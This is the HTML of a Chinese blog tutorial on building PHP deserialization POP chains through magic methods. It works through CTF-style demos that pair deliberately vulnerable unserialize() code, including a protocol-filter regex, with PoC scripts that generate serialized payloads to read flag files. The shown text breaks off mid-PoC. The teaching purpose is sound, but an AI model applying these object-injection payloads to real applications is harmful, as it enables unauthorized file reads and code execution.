@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="PHP反序列化之pop链POP链介绍POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pop链构造初探">
+<meta property="og:url" content="http://example.com/2022/09/09/PHP/pop%E9%93%BE%E6%9E%84%E9%80%A0%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="Hack the world">
+<meta property="og:description" content="PHP反序列化之pop链POP链介绍POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-09-09T15:36:23.653Z">
+<meta property="article:modified_time" content="2022-09-09T15:38:53.272Z">
+<meta property="article:author" content="D0gekong">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/2022/09/09/PHP/pop%E9%93%BE%E6%9E%84%E9%80%A0%E5%88%9D%E6%8E%A2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/09/09/PHP/pop%E9%93%BE%E6%9E%84%E9%80%A0%E5%88%9D%E6%8E%A2/","path":"2022/09/09/PHP/pop链构造初探/","title":"pop链构造初探"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pop链构造初探 | Hack the world</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hack the world</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fake it till Make it</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpop%E9%93%BE"><span class="nav-number">1.</span> <span class="nav-text">PHP反序列化之pop链</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#POP%E9%93%BE%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">POP链介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B8%B8%E8%A7%81%E8%B5%B7%E7%82%B9"><span class="nav-number">1.1.1.</span> <span class="nav-text">反序列化的常见起点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E8%B7%B3%E6%9D%BF"><span class="nav-number">1.1.2.</span> <span class="nav-text">反序列化的常见中间跳板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B8%B8%E8%A7%81%E7%BB%88%E7%82%B9"><span class="nav-number">1.1.3.</span> <span class="nav-text">反序列化的常见终点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DEMO1"><span class="nav-number">1.2.</span> <span class="nav-text">DEMO1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DEMO2"><span class="nav-number">1.3.</span> <span class="nav-text">DEMO2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DEMO3"><span class="nav-number">1.4.</span> <span class="nav-text">DEMO3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">1.5.</span> <span class="nav-text"></span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="D0gekong"
+      src="/images/pic.jpg">
+  <p class="site-author-name" itemprop="name">D0gekong</p>
+  <div class="site-description" itemprop="description">散人的漫漫学习路</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">114</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/SantaJiang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;SantaJiang" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/jiangshengda@foxmail.com" title="E-Mail → jiangshengda@foxmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.jianshu.com/u/3aa0cb901bee" title="简书 → https:&#x2F;&#x2F;www.jianshu.com&#x2F;u&#x2F;3aa0cb901bee" rel="noopener" target="_blank"><i class="fab fa-jianshu fa-fw"></i>简书</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/jsd581?spm=1010.2135.3001.5421" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;jsd581?spm&#x3D;1010.2135.3001.5421" rel="noopener" target="_blank"><i class="fab fa-csdn fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/09/PHP/pop%E9%93%BE%E6%9E%84%E9%80%A0%E5%88%9D%E6%8E%A2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pop链构造初探
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-09-09 23:36:23 / 修改时间：23:38:53" itemprop="dateCreated datePublished" datetime="2022-09-09T23:36:23+08:00">2022-09-09</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="PHP反序列化之pop链"><a href="#PHP反序列化之pop链" class="headerlink" title="PHP反序列化之pop链"></a>PHP反序列化之pop链</h1><h2 id="POP链介绍"><a href="#POP链介绍" class="headerlink" title="POP链介绍"></a>POP链介绍</h2><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的</p>
+<p>而构造pop链的要素就是要熟悉类里的成员变量以及魔术方法。关于魔术方法这里不做过多介绍，可以看下<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000007250604">https://segmentfault.com/a/1190000007250604</a>这篇文章</p>
+<h3 id="反序列化的常见起点"><a href="#反序列化的常见起点" class="headerlink" title="反序列化的常见起点"></a>反序列化的常见起点</h3><ul>
+<li><p><code>__wakeup</code> 一定会调用</p>
+</li>
+<li><p><code>__destruct</code> 一定会调用</p>
+</li>
+<li><p><code>__toString</code> 当一个对象被反序列化后又被当做字符串使用</p>
+<h3 id="反序列化的常见中间跳板"><a href="#反序列化的常见中间跳板" class="headerlink" title="反序列化的常见中间跳板"></a>反序列化的常见中间跳板</h3></li>
+<li><p><code>__toString</code> 当一个对象被当做字符串使用</p>
+</li>
+<li><p><code>__get</code> 读取不可访问或不存在属性时被调用</p>
+</li>
+<li><p><code>__set</code> 当给不可访问或不存在属性赋值时被调用</p>
+</li>
+<li><p><code>__isset</code> 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 <code>$this-&gt;$func();</code></p>
+<h3 id="反序列化的常见终点"><a href="#反序列化的常见终点" class="headerlink" title="反序列化的常见终点"></a>反序列化的常见终点</h3></li>
+<li><p><code>__call</code> 调用不可访问或不存在的方法时被调用</p>
+</li>
+<li><p><code>call_user_func</code> 一般php代码执行都会选择这里</p>
+</li>
+<li><p><code>call_user_func_array</code> 一般php代码执行都会选择这里<br>这里用三个demo来练习</p>
+</li>
+</ul>
+<h2 id="DEMO1"><a href="#DEMO1" class="headerlink" title="DEMO1"></a>DEMO1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source)) 		 &#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop3.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来我们来分析构造POP链的过程，先看最后，get请求传入一个hello参数，然后对他进行反序列化。</p>
+<ol>
+<li>我们要寻找危险的函数，比如这个DEMO中在Read对象中存在一个file_get(0方法，其中用了file_get_contents读文件，我们大概就懂了题目应该是要通过调用这个方法来读取我们的flag.php文件。</li>
+<li>然后我们来观察每个对象的各种魔术方法，入口多为wakeup,destruct,tostring魔术方法中，我们可以发现Show对象中存在一个tostring魔术方法和一个wakeup魔术方法，在执行unserialize函数的时候会先触发wakeup方法</li>
+<li>wakeup魔术方法中对Show对象的source属性进行了一个正则匹配，对应的第二个参数本应为字符串，但是这里如果source属性是某个类的对象，就会触发tostring方法，tostring也是Show对象中的魔术方法，所以这里的source属性应为一个Show类的对象。</li>
+<li>tostring中，返回了当前对象的键为str的value值给source，如果这个value不存在，可能会触发__get()魔术方法。</li>
+<li>我们接着寻找，发现在Test类中存在着__get()魔术方法，把当前对象的p属性赋给了function变量，并且以函数的形式去执行，所以如果这里的p属性是一个对象的话，就可以能调用__invoke()魔术方法</li>
+<li>发现Read类中存在__invoke()魔术方法，其中调用了本类中的file_get函数，以var作为形参，所以这里的var应该为flag.php<br>POC：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var=&quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line">$R=new Read();</span><br><span class="line">$S=new Show();</span><br><span class="line">$T=new Test();</span><br><span class="line">$T-&gt;p=$R;</span><br><span class="line">$S-&gt;str[&#x27;str&#x27;]=$T;</span><br><span class="line">$S-&gt;source=$S;</span><br><span class="line">echo urlencode(serialize($S));</span><br></pre></td></tr></table></figure>
+<h2 id="DEMO2"><a href="#DEMO2" class="headerlink" title="DEMO2"></a>DEMO2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;string&#x27;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>拿到代码，先寻找危险函数，发现在GetFlag类中存在get_flag()函数，输出flag，所以我们最终是需要通过调用GetFlag()中的get_flag()函数来输出我们的flag</li>
+<li>string1类中的tostring调用了自身str1属性的get_flag()方法，这里可以知道我们需要把string1的类的str1属性的值是GetFlag类的一个对象，并且需要调用到string1类的tostring这个方法才可以输出flag</li>
+<li>继续往上看，func类的invoke魔术方法拼接了”字符串拼接”和自身的mod1属性的值给了自身的mod2属性，这里如果mod1属性的值是string1的对象，会触发string1对象的tostring方法</li>
+<li>如果要触发func的invoke魔术方法，我们需要用函数的方式来调用func对象，这里可以发现funct中call魔术方法中以函数的形式调用了自身的mod1属性，如果这里的mod1属性是func的对象，就会触发func类中的invoke方法</li>
+<li>需要调用到func类中的invoke方法，必须先调用到funct类中的call魔术方法，call魔术方法是要调用了不存在的方法才会触发，可以看到Call类中的test1方法调用了自身mod1属性下的test2方法，这里如果mod1是funct的一个对象，就可以触发funct的call方法</li>
+<li>然后是start_gg类，，destruct魔术方法调用了自身mod1的test1方法，所以这里应该是个入口，我们需要先让他的mod1为Call类的一个对象<br>POC</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new Call();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new funct();</span><br><span class="line">        &#125;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new func();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1= new string1();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1= new GetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new start_gg();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span 